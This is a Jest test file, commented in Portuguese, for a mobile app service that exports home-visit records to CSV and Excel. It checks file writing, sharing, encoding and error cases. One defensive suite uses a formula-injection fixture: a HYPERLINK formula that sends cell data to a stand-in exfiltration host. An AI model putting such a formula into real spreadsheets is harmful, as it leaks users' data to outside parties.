/**
 * Testes do exportService.
 *
 * O mock imita a API de arquivos do Expo SDK 54 (`File` e `Paths`). O teste
 * antigo mockava `documentDirectory`, `writeAsStringAsync` e `EncodingType`,
 * que não existem mais no módulo real, e por isso passava enquanto a
 * exportação estava quebrada no aplicativo. A última suíte deste arquivo
 * compara o mock com o módulo instalado de verdade, para que a próxima
 * mudança de API apareça como teste vermelho e não como erro em campo.
 */
const escritas: { nome: string; conteudo: unknown }[] = [];

jest.mock('expo-file-system', () => {
  class FileFake {
    uri: string;
    nome: string;
    exists = false;
    constructor(_pasta: unknown, nome: string) {
      this.nome = nome;
      this.uri = `file:///documents/${nome}`;
    }
    create() {}
    delete() {}
    write(conteudo: unknown) {
      escritas.push({ nome: this.nome, conteudo });
    }
  }
  return { File: FileFake, Paths: { document: 'file:///documents/' } };
});

jest.mock('expo-sharing', () => ({
  isAvailableAsync: jest.fn().mockResolvedValue(true),
  shareAsync: jest.fn().mockResolvedValue(undefined),
}));

jest.mock('xlsx', () => ({
  utils: {
    book_new: jest.fn(() => ({})),
    json_to_sheet: jest.fn(() => ({})),
    aoa_to_sheet: jest.fn(() => ({})),
    book_append_sheet: jest.fn(),
    sheet_to_csv: jest.fn(() => 'col1;col2\nval1;val2'),
  },
  write: jest.fn(() => new ArrayBuffer(8)),
}));

import * as Sharing from 'expo-sharing';
import { exportService } from '../exportService';
import { Visita, StatusVisita, StatusSync } from '../../types';

const mockedSharing = Sharing as jest.Mocked<typeof Sharing>;

const visitasMock: Visita[] = [
  {
    id: 'v1',
    agente_id: 'a1',
    residencia_id: 'r1',
    data_visita: '2024-03-15T10:00:00.000Z',
    status: StatusVisita.REALIZADA,
    queixas: 'Dor de cabeça',
    observacoes: 'Paciente bem',
    precisa_agendamento: false,
    created_at: '2024-03-15T10:00:00.000Z',
    updated_at: '2024-03-15T10:00:00.000Z',
    status_sync: StatusSync.SINCRONIZADO,
  },
];

beforeEach(() => {
  jest.clearAllMocks();
  escritas.length = 0;
  mockedSharing.isAvailableAsync.mockResolvedValue(true);
  mockedSharing.shareAsync.mockResolvedValue(undefined);
});

describe('exportService.exportarVisitas - CSV', () => {
  it('gera arquivo CSV e compartilha', async () => {
    await exportService.exportarVisitas(
      { visitas: visitasMock, periodo: 'dia', data_referencia: '2024-03-15' },
      'csv'
    );

    expect(escritas).toHaveLength(1);
    expect(mockedSharing.shareAsync).toHaveBeenCalled();
  });

  it('nome do arquivo CSV inclui data de referência e termina em .csv', async () => {
    await exportService.exportarVisitas(
      { visitas: visitasMock, periodo: 'mes', data_referencia: '2024-03-15' },
      'csv'
    );

    expect(escritas[0].nome).toContain('2024-03-15');
    expect(escritas[0].nome).toContain('.csv');
  });

  it('grava texto com BOM para o Excel reconhecer UTF-8', async () => {
    await exportService.exportarVisitas(
      { visitas: visitasMock, periodo: 'dia', data_referencia: '2024-03-15' },
      'csv'
    );

    const conteudo = escritas[0].conteudo as string;
    expect(typeof conteudo).toBe('string');
    expect(conteudo.charCodeAt(0)).toBe(0xfeff);
    expect(conteudo).toContain('Dor de cabeça');
  });

  it('compartilha a URI devolvida pelo arquivo, nao um caminho montado a mao', async () => {
    await exportService.exportarVisitas(
      { visitas: visitasMock, periodo: 'dia', data_referencia: '2024-03-15' },
      'csv'
    );

    const uri = mockedSharing.shareAsync.mock.calls[0][0];
    expect(uri).toMatch(/^file:\/\/\/documents\/.+\.csv$/);
    expect(uri).not.toContain('undefined');
  });
});

describe('exportService.exportarVisitas - Excel', () => {
  it('gera arquivo Excel (.xlsx) e compartilha', async () => {
    await exportService.exportarVisitas(
      { visitas: visitasMock, periodo: 'semana', data_referencia: '2024-03-15' },
      'xlsx'
    );

    expect(escritas).toHaveLength(1);
    expect(escritas[0].nome).toContain('.xlsx');
    expect(mockedSharing.shareAsync).toHaveBeenCalled();
  });

  it('grava bytes, nao string base64', async () => {
    await exportService.exportarVisitas(
      { visitas: visitasMock, periodo: 'semana', data_referencia: '2024-03-15' },
      'xlsx'
    );

    expect(escritas[0].conteudo).toBeInstanceOf(Uint8Array);
  });
});

describe('exportService - injecao de formula em planilha', () => {
  const comFormula: Visita[] = [
    {
      ...visitasMock[0],
      queixas: '=HYPERLINK("http://exfiltra.example/"&A1,"clique")',
      observacoes: '+1+1',
    },
  ];

  it('neutraliza celula que comeca com = no CSV', async () => {
    await exportService.exportarVisitas(
      { visitas: comFormula, periodo: 'dia', data_referencia: '2024-03-15' },
      'csv'
    );

    const conteudo = escritas[0].conteudo as string;
    expect(conteudo).toContain("'=HYPERLINK");
    expect(conteudo).not.toMatch(/"=HYPERLINK/);
  });

  it('neutraliza celula que comeca com + no CSV', async () => {
    await exportService.exportarVisitas(
      { visitas: comFormula, periodo: 'dia', data_referencia: '2024-03-15' },
      'csv'
    );

    expect(escritas[0].conteudo as string).toContain("'+1+1");
  });
});

describe('exportService.exportarVisitas - erros', () => {
  it('lança erro quando compartilhamento não disponível', async () => {
    mockedSharing.isAvailableAsync.mockResolvedValue(false);

    await expect(
      exportService.exportarVisitas(
        { visitas: visitasMock, periodo: 'dia', data_referencia: '2024-03-15' },
        'csv'
      )
    ).rejects.toThrow('Compartilhamento não disponível');
  });

  it('lança erro quando lista de visitas vazia', async () => {
    await expect(
      exportService.exportarVisitas(
        { visitas: [], periodo: 'dia', data_referencia: '2024-03-15' },
        'csv'
      )
    ).rejects.toThrow('Sem dados');
  });
});

describe('contrato com o expo-file-system instalado', () => {
  // Sem esta suíte, o mock pode continuar imitando uma API que o Expo já
  // removeu, e foi exatamente o que aconteceu: o teste ficou verde enquanto
  // a exportação lançava TypeError no aparelho.
  const real = jest.requireActual('expo-file-system');

  it('o modulo real expoe File e Paths, que e o que o servico usa', () => {
    expect(typeof real.File).toBe('function');
    expect(typeof real.Paths).toBe('function');
  });

  it('a API antiga que o servico usava de fato nao existe mais', () => {
    expect(real.documentDirectory).toBeUndefined();
    expect(real.EncodingType).toBeUndefined();
  });
});
